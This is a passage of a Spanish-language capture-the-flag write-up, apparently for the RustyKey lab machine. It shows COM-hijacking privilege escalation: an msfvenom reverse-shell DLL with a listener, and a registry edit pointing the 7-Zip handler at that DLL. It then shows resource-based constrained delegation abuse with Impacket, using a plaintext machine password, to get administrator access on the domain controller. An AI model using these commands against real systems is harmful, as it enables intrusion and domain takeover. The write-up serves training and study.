HKEY_CLASSES_ROOT\CLSID\{C7CA6167-2F46-4C4C-98B2-C92591368971}
    (Default)    REG_SZ    New Library Menu Handler

HKEY_CLASSES_ROOT\CLSID\{c8b522d1-5cf3-11ce-ade5-00aa0044773d}
    (Default)    REG_SZ    Microsoft OLE DB Data Conversion Library

HKEY_CLASSES_ROOT\CLSID\{c8c97725-c948-4720-bf0f-e3c2273bfb7d}
    (Default)    REG_SZ    Library Initialization Handler

HKEY_CLASSES_ROOT\CLSID\{CFF9990B-6414-43F1-A526-14EA5EEAFBDA}
    (Default)    REG_SZ    Library Share Engine

HKEY_CLASSES_ROOT\CLSID\{d9b3211d-e57f-4426-aaef-30a806add397}
    (Default)    REG_SZ    Shell Library API

HKEY_CLASSES_ROOT\CLSID\{dea794e0-1c1d-4363-b171-98d0b1703586}
    (Default)    REG_SZ    ActivatableApplicationRegistrar

HKEY_CLASSES_ROOT\CLSID\{E0DF7408-44FF-47D8-BE3B-79729980CAD8}
    (Default)    REG_SZ    Windows.Storage.Search.StorageLibraryChangeTrackerTriggerDetails Factory

HKEY_CLASSES_ROOT\CLSID\{e1790c6b-8727-4598-bad3-6ba88a49c25d}
    (Default)    REG_SZ    Miracast Connection Registrar class

HKEY_CLASSES_ROOT\CLSID\{e9711a2f-350f-4ec1-8ebd-21245a8b9376}
    (Default)    REG_SZ    Navigation Pane Show Libraries Command

HKEY_CLASSES_ROOT\CLSID\{ea8b451c-5a19-49cf-bc5e-98accca49ef3}
    (Default)    REG_SZ    Library Factory

HKEY_CLASSES_ROOT\CLSID\{ecabafcf-7f19-11d2-978e-0000f8757e2a}
    (Default)    REG_SZ    EventRegistrar Class

HKEY_CLASSES_ROOT\CLSID\{eea0c191-dda8-4656-8fc4-72bdedba8a78}
    (Default)    REG_SZ    Library Property Store

HKEY_CLASSES_ROOT\CLSID\{F0A3A195-8D6A-4BC7-BD1F-3B2A2D5807CA}
    (Default)    REG_SZ    LiveProviderRegistrar

HKEY_CLASSES_ROOT\CLSID\{f3cc4ca3-22c2-40ec-ac3c-89d8a43373b0}
    (Default)    REG_SZ    Include the selected folder in a library.

HKEY_CLASSES_ROOT\CLSID\{f8d1da80-9aea-4ca4-ba41-bee6fca037b1}
    (Default)    REG_SZ    Show Library In Nav Pane verb

HKEY_CLASSES_ROOT\CLSID\{fe5afcf2-e681-4ada-9703-ef39b8ecb9bf}
    (Default)    REG_SZ    Library Description

End of search: 61 match(es) found.

```
aqui no localizamos nada para winrar, asi que buscamos con `zip`

```bash
reg query HKCR\CLSID /s /f "zip"
```
```bash
reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}
    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target
    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

End of search: 14 match(es) found.
```

para `zip` si hemos localizado, ahora vamos a validar permisos

```bash
Get-Acl "Registry::HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Select-Object -ExpandProperty Access
```
```bash
Get-Acl "Registry::HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Select-Object -ExpandProperty Access


RegistryRights    : ReadKey
AccessControlType : Allow
IdentityReference : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : None

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : CREATOR OWNER
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : InheritOnly

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : RUSTYKEY\Support
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : None

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : None

RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : InheritOnly

RegistryRights    : ReadKey
AccessControlType : Allow
IdentityReference : BUILTIN\Users
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : None

```
vemos claramente como el grupo `Support` tiene permisos `FullControl`  sobre la clave de registro asociada a 7-Zip, esto significa que puedemos modificar la DLL que se carga cuando los usuarios interactúan con archivos `ZIP`, lo que permite ejecución de código arbitrario.

### DLL Hijacking

Para la explotacion de esta vulnerabilidad crearemos una `dll` maliciosa que nos regrese una revershell, esta la vamos a cargar en el sistema y vamos a modificar el registro para que apunte a nuestra `dll` maliciosa

>>> Creando la DLL

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.132 LPORT=4445 -f dll -o zip.dll
```
```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: zip.dll
```
ahora cargaremos la dll desde el usuario `bb.morgan`

![image](https://github.com/user-attachments/assets/a14548fd-502b-4fac-be99-728dd04b35ad)

una vez cargada la dll y antes de editar los registros no colocamos en escucha 

```bash
nc -lnvp 4445
```

y una vez todo listo, modificamos el registro desde el usuario `ee.reed`

```bash
reg add "HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Windows\Temp\zip.dll" /f
```
```bash
reg add "HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Windows\Temp\zip.dll" /f
The operation completed successfully.
```

y al rato de esperar recibimos la conexion

![image](https://github.com/user-attachments/assets/8238e442-9cfe-4696-9d53-0aca7f86e340)

ahora somo el usuario `mm.turner`

revisamos a que grupos pertenece este usuario y vemos lo siguiente

```bash
whoami /groups
```
```bash
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
RUSTYKEY\DelegationManager                 Group            S-1-5-21-3316070415-896458127-4139322052-1136 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                              
```

me llama la atencion el grupo `DelegationManager` asi que vemos en `bloodhound` la relacion

![image](https://github.com/user-attachments/assets/2cbdf21b-d140-4b7f-ab3b-7727c4e489f4)

![image](https://github.com/user-attachments/assets/ce3c7325-94d6-451b-84fe-233fa1fa95eb)

### Explotacion DelegationManager

>>> Configurar RBCD

desde el usuario `mm.turner`

Añadimos `IT-COMPUTER3$` a la lista de cuentas que pueden solicitar tickets de servicio (TGS) para impersonar usuarios hacia el DC

```powershell
$computer = Get-ADComputer -Identity "IT-COMPUTER3"
Set-ADComputer -Identity "DC" -PrincipalsAllowedToDelegateToAccount $computer
```

desde la maquina atacante
>>>Obtener un ticket TGS para el servicio CIFS en el DC (usando Impacket)
```bash
export KRB5CCNAME=IT-COMPUTER3\$.ccache
```
```bash
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
```
```bash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

ahora seteamos la variable de entorno `KRB5CCNAME`

```bash
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

accedemnos con `impacket-wmiexec`

```bash
impacket-wmiexec -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
```
```powershell
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rustykey\backupadmin

C:\>cd C:\Users\Administrator
C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is 00BA-0DBE

 Directory of C:\Users\Administrator

06/04/2025  09:37 AM    <DIR>          .
06/04/2025  09:37 AM    <DIR>          ..
06/24/2025  10:00 AM    <DIR>          3D Objects
06/24/2025  10:00 AM    <DIR>          Contacts
06/24/2025  10:00 AM    <DIR>          Desktop
06/24/2025  10:00 AM    <DIR>          Documents
06/24/2025  10:00 AM    <DIR>          Downloads
06/24/2025  10:00 AM    <DIR>          Favorites
06/24/2025  10:00 AM    <DIR>          Links
06/24/2025  10:00 AM    <DIR>          Music
06/24/2025  10:00 AM    <DIR>          Pictures
06/24/2025  10:00 AM    <DIR>          Saved Games
06/24/2025  10:00 AM    <DIR>          Searches
06/24/2025  10:00 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   2,950,041,600 bytes free

C:\Users\Administrator>dir Desktop
 Volume in drive C has no label.
 Volume Serial Number is 00BA-0DBE

 Directory of C:\Users\Administrator\Desktop

06/24/2025  10:00 AM    <DIR>          .
06/24/2025  10:00 AM    <DIR>          ..
07/06/2025  03:44 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,950,045,696 bytes free

C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>cat root.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>type root.txt
fac53d668a**********806e41c3

C:\Users\Administrator\Desktop>
```

obtenemos acceso como administrator del sistema!!!

>>>No fue necesario seguir todos los pasos que mencionaba `bloodhound` porque ya contabamos con una cuenta de computadora la cual controlabamos `IT-COMPUTER3:Rusty88!`.
>>>Lo que fue necesario, fue configurar la delegacion basada en recursos `RBCD` para que la cuenta de equipo `IT-COMPUTER3$` pudiera delegar autenticación hacia el controlador de dominio






